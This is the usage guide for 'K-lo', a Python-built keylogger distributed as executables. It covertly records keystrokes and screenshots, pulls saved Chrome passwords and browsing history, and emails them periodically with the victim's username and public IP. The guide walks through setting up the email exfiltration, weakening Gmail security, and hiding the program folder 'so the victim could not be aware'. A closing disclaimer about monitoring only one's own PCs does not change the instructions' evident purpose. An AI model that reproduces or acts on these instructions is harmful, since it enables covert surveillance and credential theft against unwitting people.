####K-lo INSTRUCTIONS#### 
K-lo has the function of being a keylogger that also takes screenshots, retrieves saved passwords and web history from 
Google Chrome, these functions are performed in the time you indicate.
All the files are updated depending on the given time. 
K-lo can also send these files to an email, these are sent
every lapse of time that you indicated, with information
of the PC-user that has K-lo running and his public IP. This way you can
identify them if you have installed K-lo on more than one machine (wink).
K-lo uses the pynput librarie and it has not been reported LAG so far
during its execution, unlike pyhook. 

##FIRST STEP##
Run the K-lo.exe file and enter the minutes you want the files shown below refresh.
K-lo.exe is the main program that generates:
1.- Screenshots
2.- Excel with chrome web history
3.- Excel with passwords saved in chrome
4.- The Keylogger generates and updates each time the user types something.

You can start K-lo.exe let it run and check the files on the computer later.(Local keylogger)
Take a look to the second step if you want to generate emails that sends you the 4 files explained above.

##WARNING## 
IF YOU ARE GOING TO EMAIL THE FILES, MANAGE YOUR TIMES
BECAUSE K-lo.exe STARTS COUNTING SINCE 
THE WINDOW OF THE PROGRAM IS CLOSED, THIS IS THE SAME PROCESS WHEN EXECUTING correo.exe

##WARNING## 
FIRST YOU MUST EXECUTE K-lo.exe AND THEN correo.exe
OTHERWISE IT WILL GENERATE AN ERROR WHEN RUNNING OR SIMPLY WILL NOT DO ANYTHING.


###SECOND STEP### 
Execute correo.exe file
Follow the instructions below:
1.- Enter the minutes in which the emails will be sent periodically (choose a reasonable time)
2.- Enter the sender's email 
3.- Enter the sender's password
4.- Enter the email of the recipient
5.- WAIT FOR THE WINDOW TO CLOSE, when the window console closes
a first email is sent and then it will do it in the minutes you indicated.
check your email to confirm it is correct,
otherwise, you did something wrong when entering the email information.

##WARNING##
FOR SENDERS USE ONLY MAILS FROM outlook.com, hotmail.com or gmail.com
with recipients you can use whatever type of mail.
(AS OBVIOUS AS IT IS is recommended that you would be the owner
of the two email accounts AND DO NOT USE PERSONAL ONES, sender and recipient)

##WARNING##
If the sender is a GMAIL account you will need to enable LESS SECURE applications here https://myaccount.google.com/intro/security
sign in and enable less secure applications, choose "on".

CONGRATULATIONS!!
Several files will be shown but the important ones are:
1.-historiaweb.csv: This is the history of chrome in excel format
2.-passwords.csv: These are the passwords saved in chrome
3.-K-lo.txt: This is the history of the pressed keys (keylogger)
4.-screenshots.png: These are the screenshots

##BE AWARE##
To optimize space and be as careful as possible the file
screenshots.png is overwritten in the time you have indicated
in the K-lo.exe

If you don't want to keep running the Keylogger, finish the process using the
task Manager
IF THE COMPUTER IS TURNED OFF YOU MUST START THE KEYLOGGER AGAIN RUNNING THE STEPS
ABOVE MENTIONED (SOON TO BE FIXED) 


##BE AWARE ##
AS OBVIOUS AS IT IS YOU SHOULD HIDE THE FOLDER WHERE THE K-lo FILES ARE LOCATED
SO THE VICTIM COULD NOT BE AWARE THAT HE IS BEING MONITORED.
IT IS RECOMMENDED TO USE ANY FOLDER FROM PROGRAM FILES IN C: /
BUT PLEASE DO NOT USE DOWNLOADS, DOCUMENTS NOR DESKTOP TO HIDE THE K-lo FOLDER.
DO NOT MOVE ANY FILES FROM THE FOLDER, UNLESS YOU WANT TO MODIFY IT IN YOUR WAY GO TO THE PYTHON FOLDER
IN THERE YOU WILL FIND THE FILES WITH THE SOURCE CODE, YOU ARE FREE TO MODIFY IT.

USE IT AT YOUR OWN RISK, AND BE SURE TO ONLY MONITOR PC'S THAT ARE FROM YOUR PROPERTY 
